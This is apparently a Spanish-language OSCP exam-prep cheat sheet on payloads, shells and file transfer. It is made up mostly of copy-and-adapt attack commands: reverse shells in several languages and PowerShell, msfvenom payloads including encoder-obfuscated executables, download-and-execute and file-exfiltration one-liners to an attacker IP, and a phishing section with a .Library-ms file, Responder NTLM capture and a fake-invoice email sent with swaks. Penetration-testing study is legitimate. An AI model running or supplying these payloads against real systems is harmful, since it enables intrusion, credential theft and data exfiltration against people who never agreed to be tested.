# 06 — Payloads, shells y transferencia

---

## 1. Reverse shells

### Generales (copiar y adaptar)

Reemplazá `<TU_IP>` y `<PORT>`.

```bash
# Bash
bash -i >& /dev/tcp/<TU_IP>/<PORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<TU_IP>/<PORT> 0>&1'

# Netcat (la versión importa: -e no está en todos los nc)
nc -e /bin/sh <TU_IP> <PORT>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TU_IP> <PORT> >/tmp/f
ncat <TU_IP> <PORT> -e /bin/bash

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<TU_IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="<TU_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$s=fsockopen("<TU_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<TU_IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat (shell completa con PTY — la mejor)
socat TCP:<TU_IP>:<PORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### PowerShell

```powershell
# Clásico
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<TU_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Codificado en base64 (evita problemas de comillas y algunos filtros)
# En tu Kali:
echo -n '<COMANDO_PS>' | iconv -t UTF-16LE | base64 -w0
# Y en la víctima:
powershell -nop -enc <BASE64>
```

### Escuchar en tu Kali

```bash
# Con rlwrap, para tener historial y flechas
rlwrap -cAr nc -lvnp <PORT>

# Socat, para una PTY real de una
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

### Penelope — handler moderno (alternativa a nc/rlwrap)

Maneja las shells como sesiones: **auto-upgrade a PTY**, logging, transferencia de
archivos, port forwarding y módulos que bajan herramientas (linpeas, winPEAS, PowerUp,
GodPotato, mimikatz, LaZagne…). Viene en Kali.

```bash
sudo apt install penelope      # o: pipx install penelope-shell-handler
penelope                        # escucha en 4444 por defecto
penelope -p 443 -i tun0         # puerto e interfaz concretos
```

Dentro: `help`, `sessions`, `modules`, `upload`, `download`, `upgrade`.
Útil cuando encadenás varias shells y no querés pelearte con `stty` ni con `nc`.

---

## 2. msfvenom

**`msfvenom` NO está restringido por las reglas del examen.** Podés generar payloads para todas
las máquinas. Lo restringido es el *payload* `meterpreter` y los *módulos* de Metasploit.

### Windows

```bash
# Ejecutable clásico
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f dll -o evil.dll

# MSI (para AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f msi -o evil.msi

# Servicio ASPX (webshell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f aspx -o shell.aspx

# JSP / WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f war -o shell.war

# Ofuscado (para evadir firmas básicas)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe
```

### Linux

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f elf -o shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f elf -o m.elf   # ¡meterpreter = 1 sola máquina!
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=<PORT> -f raw -o shell.php
msfvenom -p python/shell_reverse_tcp LHOST=<TU_IP> LPORT=<PORT> -f raw -o shell.py
```

### Listar lo disponible

```bash
msfvenom --list payloads | grep -i "windows/x64"
msfvenom --list formats
msfvenom --list encoders
```

### Handler

`multi/handler` está **explícitamente exento** de la restricción de una sola máquina.

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/shell_reverse_tcp; \
  set LHOST <TU_IP>; set LPORT <PORT>; \
  set ExitOnSession false; exploit -j"
```

> **Recordá**: si tu payload es `meterpreter/*`, estás consumiendo tu única carta de Metasploit.
> Si es `shell_reverse_tcp`, no.

---

## 3. Transferencia de archivos

### Desde tu Kali hacia la víctima

```bash
# Servidor HTTP — el más simple
python3 -m http.server 8000
# O para subir archivos:
python3 -m uploadserver 8000     # si está instalado
```

```bash
# Linux víctima
wget http://<TU_IP>:8000/file
curl -O http://<TU_IP>:8000/file
```

```powershell
# Windows víctima
certutil -urlcache -split -f http://<TU_IP>:8000/file.exe C:\Temp\file.exe
Invoke-WebRequest http://<TU_IP>:8000/file.exe -OutFile C:\Temp\file.exe
(New-Object Net.WebClient).DownloadFile('http://<TU_IP>:8000/f.exe','C:\Temp\f.exe')

# Con Puerta trasera descargando y ejecutando sin tocar disco (si está permitido)
IEX (New-Object Net.WebClient).DownloadString('http://<TU_IP>:8000/script.ps1')
```

```cmd
:: Sin PowerShell disponible
bitsadmin /transfer job /download /priority high http://<TU_IP>:8000/f.exe C:\Temp\f.exe
```

### SMB — útil cuando HTTP está filtrado

```bash
# En tu Kali, servidor SMB anónimo con impacket
smbserver.py share /tmp/tools -smb2support

# En la víctima Windows
copy \\<TU_IP>\share\file.exe C:\Temp\file.exe
```

### Desde la víctima hacia tu Kali

```bash
# En tu Kali, recibir
nc -lvnp 9001 > archivo_recibido

# En la víctima (Linux)
cat /ruta/archivo > /dev/tcp/<TU_IP>/9001
nc <TU_IP> 9001 < /ruta/archivo
curl -X POST --data-binary @/ruta/archivo http://<TU_IP>:8000/
```

```powershell
# Windows
Invoke-WebRequest -Uri http://<TU_IP>:8000/ -Method POST -InFile C:\ruta\archivo
```

### Base64 — cuando todo lo demás está bloqueado

Útil para archivos chicos cuando no hay conectividad saliente:

```bash
# En la víctima
base64 -w0 archivo
# Pegás la salida acá, en tu Kali
echo '<BASE64>' | base64 -d > archivo_recuperado
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\ruta\archivo"))
# Y para escribir:
[IO.File]::WriteAllBytes("C:\Temp\out", [Convert]::FromBase64String("<BASE64>"))
```

**Cuidado**: base64 de un archivo grande se vuelve inmanejable. Es para archivos chicos
(un `id_rsa`, un `.xml`, hashes).

---

## 4. Estabilizar la shell

### Linux — TTY completa

```bash
# Método 1: python pty (el más confiable)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200

# Método 2: script
script -qc /bin/bash /dev/null
# Ctrl+Z
stty raw -echo; fg
```

### Windows — mejorar la shell

```powershell
# Si tenés una shell de cmd, pasá a PowerShell
powershell -ep bypass

# Cargar PowerView/Host Recon desde la red
IEX (New-Object Net.WebClient).DownloadString('http://<TU_IP>:8000/PowerView.ps1')

# Mejor todavía: conseguí WinRM y usá evil-winrm
evil-winrm -i <IP> -u user -p pass
```

> **Si tu único acceso es una webshell, NO es una shell válida para los flags.**
> Necesitás una reverse shell interactiva antes de tocar `local.txt` / `proof.txt`.
> Leer el flag desde una shell web da **cero puntos**. Ver `00-reglas-examen.md`.

---

## 5. Servir archivos desde tu Kali — chuleta

Tres servidores que conviene tener a mano:

```bash
# HTTP — para todo
python3 -m http.server 8000

# SMB — para Windows, y cuando HTTP está filtrado
smbserver.py share /tmp/tools -smb2support

# FTP — cuando solo hay cliente FTP
python3 -m pyftpdlib -p 21 -w
```

**Regla de higiene**: creá un directorio de trabajo dedicado antes del examen y dejá ahí todo
lo que vas a necesitar subir. No improvises el minuto 14 del examen.

```bash
mkdir -p ~/examen/tools/{linux,win}
# Ahí van: linpeas.sh, winPEASx64.exe, PowerUp.ps1, GodPotato.exe,
# PrintSpoofer64.exe, accesschk.exe, procdump.exe, pspy64, chisel, ligolo-ng
```

---

## 6. Entrega client-side y phishing

> Fuente: [oscp.adot8.com — Code execution via Windows Library](https://oscp.adot8.com/cool/client-side-attacks/code-execution-via-windows-library).
> Estas tácticas son de **acceso inicial** (enganchar a un usuario). En el examen OSCP el vector
> suele ser un servicio, pero en práctica/labs aparecen.

### 6.1 Library-ms → autenticación forzada / ejecución

Un archivo `.Library-ms` describe una "biblioteca" de Windows que puede apuntar a una ruta
**remota**. Cuando la víctima lo abre, Explorer se conecta a esa ruta: eso filtra el **hash
NTLM** (con `Responder`) o, si alojas contenido malicioso, deriva en ejecución.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>\\<TU_IP>\share</url>       <!-- o http://<TU_IP> con WebDAV -->
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Flujo típico:

```bash
# 1) Servir por WebDAV (mejor que SMB: sale por HTTP, atraviesa proxies)
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/adot8/webdav/

# 2) Capturar/relayar la autenticación que provoca
sudo responder -I tun0                 # captura NTLM
# o ntlmrelayx / certipy relay         # relay

# 3) Entregar por email (adjunto)
swaks --to victima@dominio.com --from it@dominio.com \
      --header 'Subject: Factura pendiente' --body 'Adjunto el documento.' \
      --server <IP_SMTP> --attach @config.Library-ms
```

> La variante **Evil Icon** es un `.lnk` con `iconReference` apuntando a una ruta UNC/WebDAV
> tuya: al ver el icono en Explorer, la víctima se autentica sola.

### 6.2 Formatos típicos de entrega

| Formato | Idea |
| --- | --- |
| `.Library-ms` / `.lnk` (Evil Icon) | auth forzada / ejecución al abrir |
| Documentos con **macros** (`.docm`, `.xlsm`) | `AutoOpen` → shell |
| **HTA** (`.hta`) | `mshta` ejecuta VBScript/JScript |
| **.iso / .img** | monta y evade Mark-of-the-Web |
| `.scf`, `.url` | iconos/rutas remotas → filtración NTLM |

### 6.3 Checklist de entrega

- `wsgidav` o SMB según el entorno.
- `swaks` para el correo; credenciales SMTP si las tenés.
- `Responder` o `certipy relay` escuchando **antes** de enviar.
- Verificá que la víctima alcanza tu IP (si hay pivote, ver `07-pivoting.md`).
